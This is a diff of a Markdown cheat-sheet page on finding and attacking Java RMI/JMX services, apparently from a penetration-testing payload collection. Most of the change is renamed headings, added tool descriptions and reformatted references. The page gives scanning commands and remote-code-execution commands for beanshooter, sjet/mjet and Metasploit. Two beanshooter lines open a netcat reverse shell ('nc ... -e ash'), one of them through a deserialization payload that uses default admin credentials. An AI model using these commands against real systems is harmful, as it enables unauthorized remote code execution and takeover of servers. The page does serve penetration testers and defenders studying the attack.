@@ -2,22 +2,25 @@
 
 > Java RMI (Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they're on different physical machines. RMI provides a mechanism for Java-based distributed computing.
 
+
 ## Summary
 
 * [Tools](#tools)
 * [Detection](#detection)
-* [Exploitation](#exploitation)
-  * [RCE using beanshooter](#rce-using-beanshooter)
-  * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)
-  * [RCE using Metasploit](#rce-using-metasploit)
+* [Methodology](#methodology)
+    * [RCE using beanshooter](#rce-using-beanshooter)
+    * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)
+    * [RCE using Metasploit](#rce-using-metasploit)
 * [References](#references)
+
 
 ## Tools
 
-- [siberas/sjet](https://github.com/siberas/sjet)
-- [mogwailabs/mjet](https://github.com/mogwailabs/mjet)
-- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
+- [siberas/sjet](https://github.com/siberas/sjet) - siberas JMX exploitation toolkit
+- [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX exploitation toolkit
+- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI Vulnerability Scanner
 - [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX enumeration and attacking tool.
+
 
 ## Detection
 
@@ -35,7 +38,7 @@
   |     javax.management.remote.rmi.RMIServerImpl_Stub
   ```
 
-* Using [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):
+* Using [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):
   ```bash
   $ rmg scan 172.17.0.2 --ports 0-65535
   [+] Scanning 6225 Ports on 172.17.0.2 for RMI services.
@@ -60,7 +63,7 @@
   [...]
   ```
 
-* Using Metasploit
+* Using [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
   ```bash
   use auxiliary/scanner/misc/java_rmi_server
   set RHOSTS <IPs>
@@ -68,7 +71,7 @@
   run
   ```
 
-## Exploitation
+## Methodology
 
 If a Java Remote Method Invocation (RMI) service is poorly configured, it becomes vulnerable to various Remote Code Execution (RCE) methods. One method involves hosting an MLet file and directing the JMX service to load MBeans from a distant server, achievable using tools like mjet or sjet. The remote-method-guesser tool is newer and combines RMI service enumeration with an overview of recognized attack strategies.
 
@@ -84,10 +87,12 @@ If a Java Remote Method Invocation (RMI) service is poorly configured, it become
 * Enumerate JMX endpoint: `beanshooter enum 172.17.0.2 1090`
 * Invoke method on a JMX endpoint: `beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`
 * Invoke arbitrary public and static Java methods: 
-  ```ps1
-  beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
-  beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
-  ```
+
+    ```ps1
+    beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
+    beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+    ```
+    
 * Standard MBean execution: `beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
 * Deserialization attacks on a JMX endpoint: `beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`
 
@@ -134,8 +139,9 @@ set RPORT <PORT>
 run
 ```
 
+
 ## References
 
-* [ATTACKING RMI BASED JMX SERVICES - HANS-MARTIN MÜNCH, 28 April 2019](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
-* [JMX RMI – MULTIPLE APPLICATIONS RCE - Red Timmy Security, 26 March 2019](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
-* [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel, 15 August 2021](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
+- [Attacking RMI based JMX services - Hans-Martin Münch - April 28, 2019](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
+- [JMX RMI - MULTIPLE APPLICATIONS RCE - Red Timmy Security - March 26, 2019](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
+- [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - August 15, 2021](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
